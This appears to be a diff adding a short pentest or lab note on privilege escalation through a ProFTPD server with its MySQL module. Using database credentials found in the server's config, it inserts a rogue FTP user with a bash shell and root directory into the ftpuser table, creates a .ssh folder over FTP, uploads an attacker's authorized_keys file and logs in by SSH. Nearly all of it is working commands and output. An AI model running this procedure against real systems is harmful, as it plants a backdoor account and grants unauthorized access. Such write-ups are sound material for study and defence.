@@ -1,0 +1,31 @@
+#!/usr/bin/peno
+
+
+#Privelege escalation with mysql & ftp
+#During our enumeration we discover that the previously discoveted FTP service is a proftpd service with the myssql module enabled.
+# (Include /etc/proftpd/sql.conf inside /etc/proftpd/proftpd.conf)
+#Viewing the file /etc/proftpd/sql.conf we found the mysql ftp user.
+
+#1-creating the user password using the proftp format
+/bin/echo "{md5}"`/bin/echo -n "benoitpass" | openssl dgst -binary -md5 | openssl enc -base64` 
+
+#2-Add the new entry in the database (with phpmyadmin or with console command :)
+mysql -u user -ppasswd
+use proftpd;
+INSERT INTO `ftpuser` (`id`, `userid`, `passwd`, `uid`, `gid`, `homedir`, `shell`, `count`, `accessed`, `modified`) VALUES (NULL, 'benoit', '{md5}qc46aQOnqnQYvGKfkHR6pA==', '1002', '1002', '/', '/bin/bash', '0', '2022-09-21 20:44:08', '2022-09-21 20:44:08'); 
+
+#3-Connecting to the FTP server and create a /home/benoit/.ssh folder
+
+ftp> cd /home/benoit
+250 CWD command successful
+ftp> mkdir .ssh
+257 "/home/benoit/.ssh" - Directory successfully created
+
+#prepare an authorized keys file cp ~/.ssh/id_rsa.pub authorized_keys. and upload it
+ftp> cd .ssh
+250 CWD command successful
+ftp> put authorized_keys 
+
+#gaining access via SSH and our key as benoit
+ssh -i ~/.ssh/id_rsa benoit@IP
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)
